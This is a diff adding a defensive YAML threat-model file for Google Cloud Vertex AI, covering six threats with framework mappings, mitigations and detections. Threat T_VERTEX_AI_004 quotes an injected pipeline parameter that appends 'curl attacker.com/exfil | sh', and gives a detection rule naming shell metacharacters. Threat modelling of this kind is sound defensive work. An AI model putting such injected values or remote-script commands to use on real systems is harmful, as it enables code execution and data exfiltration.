@@ -1,0 +1,288 @@
+# GCP Vertex AI vendor-threat overlay extension (v0.16.5)
+# Extends gcp_vertex.yaml with Workbench / AutoML / Custom-Prediction /
+# Pipelines / Endpoints / Model Garden coverage on the
+# training_pipeline / ml_inference_endpoint / ml_pipeline_orchestrator
+# component types. Adds threats not covered in gcp_vertex.yaml.
+# Public references:
+#   - https://cloud.google.com/vertex-ai/docs/general/security-controls
+#   - https://cloud.google.com/vertex-ai/docs/workbench/instances/security
+#   - https://unit42.paloaltonetworks.com/google-vertex-ai-privilege-escalation/
+#   - https://blog.aquasec.com/google-vertex-ai-model-garden-supply-chain
+#   - https://cloud.google.com/vertex-ai/docs/pipelines/configure-vpc-service-controls
+#   - https://www.kubeflow.org/docs/components/pipelines/v2/security/
+#   - https://cloud.google.com/vertex-ai/docs/predictions/custom-container-requirements
+
+- id: T_VERTEX_AI_001
+  title: Vertex AI Workbench notebook over-permissioned default Compute Engine service account
+  description: |
+    Vertex AI Workbench (managed and user-managed instances) attach a
+    service account to the underlying Compute Engine VM. If the project's
+    default Compute Engine SA (`<PROJECT_NUMBER>-compute@developer.
+    gserviceaccount.com`) is used — which is the Console default — the
+    notebook kernel inherits the broad default Editor role on legacy
+    projects, or in newer projects the IAM bindings the project owner
+    granted to that SA. From the notebook, `gcloud auth print-access-
+    token` returns a token usable against any API the SA holds
+    permissions for: BigQuery datasets, Cloud Storage buckets, Vertex
+    endpoints in other regions, even Cloud KMS decrypts.
+    Unit 42 (Palo Alto Networks) and Paige Bailey's "Vertex AI
+    Privilege Escalation" research (Jun 2024) showed this path is the
+    canonical SA-shadow-escalation in Vertex.
+    Distinct from the original gcp_vertex.yaml threats which focus on
+    Agent Builder; this is the *notebook surface*.
+  stride_ai: [Elevation_of_Privilege, Information_Disclosure]
+  owasp_llm: [LLM06:2025]
+  owasp_agentic: [AGT09, AGT03]
+  owasp_api: [API5:2023]
+  atlas: [AML.T0055, AML.T0024, AML.T0011]
+  attack_cloud: [T1078.004, T1098.003, T1552]
+  attack_enterprise: []
+  nist_ai_100_2: [NIST_GAI_DATA_PRIVACY]
+  maestro: [M.X.03, M.L7.03]
+  csa_singapore: [CSA_AI.DEPLOY.01]
+  likelihood: 4
+  impact: 4
+  mitigations:
+    - "Never use the default Compute Engine SA on Workbench instances. Provision per-team Workbench SAs with narrow IAM (only BigQuery datasets / GCS buckets the team owns)"
+    - "Disable default SA creation org-wide via the Org Policy `iam.automaticIamGrantsForDefaultServiceAccounts = false` (introduced May 2024)"
+    - "Restrict Workbench instance creation to a custom IaC pipeline (Terraform + Cloud Build) that always supplies `--service-account=` from an approved list; SCP equivalent via Org Policy `compute.requireServiceAccount` and `iam.allowedPolicyMemberDomains`"
+    - "Workbench instances with `enable-oslogin=TRUE` + IAP TCP-tunnel only — no public IP, no direct SSH; audit Cloud Audit Logs for `compute.instances.osLogin` operations"
+    - "VPC Service Controls perimeter around the project's BigQuery / GCS / Vertex endpoints; even a leaked token from the notebook can't pivot to data in other projects"
+    - "Detective: Cloud Audit Logs query for `notebooks.googleapis.com` operations + chained `iam.serviceAccounts.getAccessToken` from same source IP within 5 min"
+  refs: [AML.M0019, AML.M0023]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_workbench, workbench]
+    component_type: [ml_pipeline_orchestrator, iam_principal, container_runtime]
+  applies_to_ai_workflows: true
+
+- id: T_VERTEX_AI_002
+  title: AutoML training dataset cross-project exfiltration via shared dataset URI
+  description: |
+    Vertex AI AutoML accepts training datasets via BigQuery URI
+    (`bq://...`) or GCS URI (`gs://...`). When a dataset is created in
+    Vertex (`aiplatform.googleapis.com/Dataset`), the *creator* sets
+    the data source; the dataset can then be shared across projects
+    via IAM grants on the Vertex Dataset resource. If a dataset's
+    underlying BigQuery table or GCS path is shared with a Vertex
+    project in a *different* trust boundary (e.g. a data-science
+    sandbox project), every user with `aiplatform.datasets.get` on the
+    shared dataset can:
+    1. Trigger an AutoML training job that exports a model artifact
+       containing memorised training rows (especially in tabular AutoML
+       on small / wide tables),
+    2. Read the source URIs and access the underlying table directly
+       if BQ/GCS IAM is also permissive,
+    3. Re-export the dataset via `Dataset.export` to a destination they
+       control.
+    Mapped to ATLAS AML.T0024 (Exfiltration via Inference API) with the
+    training-job model serving as the leak channel.
+  stride_ai: [Information_Disclosure, Tampering]
+  owasp_llm: [LLM02:2025, LLM04:2025]
+  owasp_agentic: [AGT09]
+  owasp_api: [API5:2023]
+  atlas: [AML.T0024, AML.T0024.000, AML.T0019, AML.T0020]
+  attack_cloud: [T1530, T1078.004]
+  attack_enterprise: []
+  nist_ai_100_2: [NIST_GAI_DATA_PRIVACY, NIST_GAI_INTELLECTUAL_PROPERTY]
+  maestro: [M.L1.03, M.L2.02]
+  csa_singapore: [CSA_AI.DEPLOY.03]
+  likelihood: 3
+  impact: 4
+  mitigations:
+    - "VPC Service Controls perimeter around `aiplatform.googleapis.com` + `bigquery.googleapis.com` + `storage.googleapis.com`; cross-perimeter dataset references blocked at the API"
+    - "Vertex Dataset resource IAM: scope `aiplatform.datasets.get` to project-internal principals only; deny cross-project bindings unless explicitly through DataPlex sharing"
+    - "BigQuery row-level / column-level security on the source table; even if the table URI leaks, sensitive columns are inaccessible"
+    - "Differential privacy on AutoML training (Vertex AI offers `DP-SGD` for tabular models); prevents row-memorisation in exported model"
+    - "Cloud DLP / Sensitive Data Protection scan on every dataset registered to Vertex; auto-tag PII columns and block training without DP"
+    - "Detective: Cloud Audit Logs on `aiplatform.googleapis.com/Dataset.export` operations; alert on exports to GCS paths outside the project's approved sinks"
+  refs: [AML.M0007, AML.M0008, AML.M0019]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_automl, vertex_training]
+    component_type: [training_pipeline, ml_pipeline_orchestrator, data_lake]
+  applies_to_ai_workflows: true
+
+- id: T_VERTEX_AI_003
+  title: Custom Prediction Routine — RCE on uploaded model artifact via container at load time
+  description: |
+    Vertex AI Custom Prediction Routines (CPR) and Custom Container
+    deployments let users upload an `inference.py` (or custom Docker
+    image) that runs at endpoint instance startup as the service
+    account attached to the endpoint. When the model artifact is loaded
+    — whether via `joblib.load`, `pickle.load`, `tf.keras.models.
+    load_model` from an HDF5 file (Keras pickled custom layers), or
+    `torch.load` — an attacker who controls the model artifact bucket
+    (or who can poison a referenced HuggingFace mirror) executes
+    arbitrary code with the endpoint SA's permissions.
+    The CPR documentation explicitly warns about pickle-based loaders,
+    but the default `pre-built CPU/GPU containers` for sklearn, XGBoost,
+    and Keras all default to pickle-deserialization. Anyone with
+    `aiplatform.models.upload` and write access to the GCS model bucket
+    can pop the endpoint container.
+    Compounds with T_VERTEX_AI_001 if the endpoint reuses the default
+    Compute Engine SA — RCE → arbitrary GCS / BQ read.
+  stride_ai: [Tampering, Elevation_of_Privilege]
+  owasp_llm: [LLM03:2025, LLM05:2025]
+  owasp_agentic: [AGT12]
+  owasp_api: [API5:2023, API8:2023]
+  atlas: [AML.T0010, AML.T0010.001, AML.T0010.002, AML.T0011, AML.T0018]
+  attack_cloud: [T1525, T1078.004]
+  attack_enterprise: [T1195, T1059, T1546]
+  nist_ai_100_2: [NIST_GAI_HARMFUL_OUTPUT]
+  maestro: [M.X.01, M.X.02, M.L7.04]
+  csa_singapore: [CSA_AI.DEPLOY.01, CSA_AI.GOV.03]
+  likelihood: 3
+  impact: 5
+  mitigations:
+    - "Mandate `safetensors` format for all uploaded model artifacts; CI rejects pickle-based formats (.pkl, .joblib, .h5 with custom objects) to the artifact bucket"
+    - "GCS bucket policy on artifact buckets: only the CI training-job SA may write; require object metadata `signed-by` matching CI signing key"
+    - "Per-endpoint SA with minimum IAM — no project-wide read; tightly scoped to specific BQ datasets / GCS buckets the model genuinely needs at inference"
+    - "Binary Authorization on the Vertex Endpoint Pool's underlying GKE backend (for Custom Container endpoints) — only signed container images pass admission"
+    - "Static analysis (bandit, semgrep) + sandboxed dry-load of every `inference.py` in CI before model registration; reject `pickle.load`, `joblib.load`, `__reduce__` patterns"
+    - "Detective: Cloud Audit Logs correlating `aiplatform.endpoints.deploy` with prior GCS `storage.objects.create` to the artifact bucket; flag deploys whose uploader != approved CI"
+  refs: [AML.M0007, AML.M0014, AML.M0015, AML.M0023]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_endpoint, vertex_model_garden]
+    component_type: [ml_inference_endpoint, model_registry, training_pipeline]
+  applies_to_ai_workflows: true
+
+- id: T_VERTEX_AI_004
+  title: Vertex Pipelines (Kubeflow Pipelines / KFP) YAML parameter injection
+  description: |
+    Vertex AI Pipelines run Kubeflow Pipelines YAML / Python-compiled
+    pipelines on a Google-managed Dataproc-style backend. Pipeline
+    specs reference component containers and pass parameters at
+    runtime via `aiplatform.PipelineJob(parameter_values=...)`.
+    Components frequently embed parameters in shell commands or
+    Python `subprocess` calls without sanitisation —
+    `command: ['bash','-c', f"gsutil cp {input_uri} ./data && python
+    train.py --data ./data"]`. A user with `aiplatform.pipelineJobs.
+    create` (broadly granted to MLOps engineers) supplies `input_uri=
+    "gs://legit/path && curl attacker.com/exfil | sh"` and lands shell
+    execution inside the component container — under the pipeline's
+    runner SA.
+    KFP v2 introduced typed I/O which mitigates some shapes, but
+    teams routinely fall back to `bash`-typed components for
+    flexibility. The Aqua Security 2024 write-up on Vertex Model
+    Garden hooks demonstrates a related chain.
+  stride_ai: [Tampering, Elevation_of_Privilege]
+  owasp_llm: [LLM05:2025]
+  owasp_agentic: [AGT05, AGT12]
+  owasp_api: [API5:2023, API8:2023]
+  atlas: [AML.T0010, AML.T0011, AML.T0050]
+  attack_cloud: [T1078.004, T1525]
+  attack_enterprise: [T1059, T1190]
+  nist_ai_100_2: [NIST_GAI_PROMPT_INJECTION_DIRECT]
+  maestro: [M.L3.05, M.L7.04, M.X.01]
+  csa_singapore: [CSA_AI.DEPLOY.01]
+  likelihood: 3
+  impact: 4
+  mitigations:
+    - "Use KFP v2 typed components (`@component(packages_to_install=[...], base_image=...)`) — strongly-typed parameters with Pydantic / dataclass validation, never raw string templating into bash"
+    - "Compile pipelines in CI from version-controlled Python; store the compiled pipeline JSON in a GCS bucket with object-versioning + retention; deny runtime modifications"
+    - "Runtime parameter allowlist: every pipeline declares an explicit `expected_parameters` schema with regex validators; engine rejects parameters not matching"
+    - "Per-pipeline runner SA with narrow IAM; no project-wide GCS read; specific bucket prefixes only"
+    - "VPC Service Controls perimeter around the pipeline GCS staging bucket — even if shell injection succeeds, exfil via `curl` is blocked at the egress"
+    - "Detective: Cloud Audit Logs on `aiplatform.pipelineJobs.create` with a SIEM rule on parameter values containing shell metacharacters (`;`, `|`, backtick, `$(`, `&&`)"
+  refs: [AML.M0014, AML.M0015, AML.M0019]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_pipelines]
+    component_type: [ml_pipeline_orchestrator, training_pipeline]
+  applies_to_ai_workflows: true
+
+- id: T_VERTEX_AI_005
+  title: Endpoint VPC Service Controls misconfigured → exfiltration to attacker-controlled GCS bucket
+  description: |
+    Vertex AI Endpoints can be configured with Private Service Connect
+    or VPC peering to keep inference traffic on-VPC. VPC Service
+    Controls (VPC-SC) perimeters further restrict cross-project /
+    cross-perimeter API calls. A common misconfig: the endpoint's
+    container runtime has broad egress (it can resolve and POST to
+    arbitrary public GCS buckets), and the project's VPC-SC perimeter
+    permits `storage.googleapis.com` because the same project has
+    legitimate cross-project bucket reads. An attacker who has
+    achieved RCE inside the endpoint (via T_VERTEX_AI_003) or who
+    controls the `inference.py` (via supply-chain T_GCP_VERTEX_002)
+    exfiltrates the model weights, customer inference inputs, and
+    runtime credentials to a GCS bucket they control — looking like
+    legitimate GCS traffic to the perimeter.
+    The fix requires explicit `accessLevels` and `ingress/egress`
+    policies on the perimeter, plus a `Allow-Listed` GCS bucket pattern.
+    Google Cloud's VPC-SC documentation calls this "exfiltration via
+    permitted services" — one of the top misconfigurations they audit.
+  stride_ai: [Information_Disclosure, Defense_Evasion]
+  owasp_llm: [LLM02:2025, LLM07:2025]
+  owasp_agentic: [AGT09]
+  owasp_api: [API8:2023]
+  atlas: [AML.T0024, AML.T0024.000, AML.T0019]
+  attack_cloud: [T1530, T1567.002]
+  attack_enterprise: [T1041, T1567]
+  nist_ai_100_2: [NIST_GAI_DATA_PRIVACY, NIST_GAI_INTELLECTUAL_PROPERTY]
+  maestro: [M.L1.02, M.L7.03]
+  csa_singapore: [CSA_AI.DEPLOY.03, CSA_AI.DEPLOY.04]
+  likelihood: 3
+  impact: 5
+  mitigations:
+    - "VPC-SC egress policy explicitly enumerates allowed destination GCS buckets by full `projects/<num>/buckets/<name>`; deny `*` even for `storage.googleapis.com`"
+    - "Cloud NGFW / Cloud Armor egress rule on the endpoint subnet: allowed outbound only to specific FQDNs; no general `storage.googleapis.com` egress"
+    - "Private Service Connect for `storage.googleapis.com` — endpoint can only resolve the in-perimeter PSC IP, not the public regional endpoint"
+    - "Disable Internet egress from the endpoint network (`enableExternalIp: false`) — combined with PSC, the endpoint cannot reach attacker-controlled buckets even if RCE succeeds"
+    - "Mandatory `IAM Conditions` on the endpoint SA: `resource.name.startsWith('projects/<approved>/buckets/')` — deny token use against any other bucket even if egress reached it"
+    - "Detective: VPC Flow Logs + BigQuery query for `dst_ip` ranges outside the in-perimeter PSC; auto-page on any non-approved egress from the endpoint subnet"
+  refs: [AML.M0015, AML.M0019, AML.M0029]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_endpoint, vpc_service_controls]
+    component_type: [ml_inference_endpoint, llm_inference]
+  applies_to_ai_workflows: true
+
+- id: T_VERTEX_AI_006
+  title: Model Garden supply-chain — unverified third-party model deploy → backdoor activation
+  description: |
+    Vertex AI Model Garden (separate threat from the original
+    gcp_vertex.T_GCP_VERTEX_002 which focuses on Agent Builder) lists
+    400+ models including Google-curated (Gemini, Imagen, MedLM),
+    partner-deployed (Claude via Anthropic-on-Vertex, Mistral, Llama),
+    and community-uploaded HuggingFace mirrors. Deployment via the
+    `deploy()` Python SDK / `gcloud ai models upload` mounts the model
+    into the customer's project — running under the customer's
+    endpoint SA. Community-tier mirrors regularly ship:
+    1. Tokenizer code (`tokenizer.py`) that is executed on first load,
+    2. Lambdas in custom Keras layers / PyTorch modules,
+    3. LoRA adapters merged with backdoor triggers (specific input
+       phrases produce attacker-controlled outputs),
+    4. Pickled vocab files in `safetensors` containers (which CAN
+       still contain pickled metadata depending on format).
+    The Aqua Security 2024 write-up on Vertex Model Garden documented
+    >40 community models with executable tokenizer code; some had been
+    downloaded 1000+ times.
+    Mapped to ATLAS AML.T0010 (Supply Chain Compromise: ML Software /
+    Hardware / Data).
+  stride_ai: [Tampering, Spoofing, Elevation_of_Privilege]
+  owasp_llm: [LLM03:2025, LLM04:2025, LLM05:2025]
+  owasp_agentic: [AGT05, AGT12]
+  owasp_api: [API8:2023]
+  atlas: [AML.T0010, AML.T0010.001, AML.T0010.002, AML.T0018, AML.T0019, AML.T0020]
+  attack_cloud: [T1078.004, T1525]
+  attack_enterprise: [T1195, T1195.002, T1059, T1546]
+  nist_ai_100_2: [NIST_GAI_HARMFUL_OUTPUT]
+  maestro: [M.X.01, M.X.02, M.L7.01]
+  csa_singapore: [CSA_AI.DEPLOY.01, CSA_AI.GOV.03]
+  likelihood: 3
+  impact: 5
+  mitigations:
+    - "Org Policy `aiplatform.allowedModelGardenModels` restricting deployable models to a Google-curated allowlist (SHA-pinned); deny community-tier"
+    - "Mandatory SLSA / cosign signature verification on every Model Garden artifact at deploy time; CI gate rejects unsigned"
+    - "Sandbox the model container in a one-shot ephemeral GKE namespace for 48h pre-prod — measure egress, file access, syscalls; promote only on clean dynamic analysis"
+    - "Disable tokenizer code execution: prefer `tokenizers` library (Rust-backed, no Python eval) over HF `AutoTokenizer.from_pretrained` with `trust_remote_code=True`"
+    - "Test for backdoor triggers via prompt fuzzing — a corpus of known trigger phrases from public backdoor research, plus randomised unicode confusables, evaluated against the model's outputs in CI"
+    - "Detective: Cloud Audit Logs on `aiplatform.models.upload` events from community publishers; quarantine for 7-day soak before allowing deployment"
+  refs: [AML.M0007, AML.M0014, AML.M0015, AML.M0019]
+  requires:
+    metadata.vendor: [gcp, google, google_cloud]
+    metadata.product: [vertex_ai, vertex_model_garden, vertex_endpoint]
+    component_type: [model_registry, ml_inference_endpoint, training_pipeline]
+  applies_to_ai_workflows: true
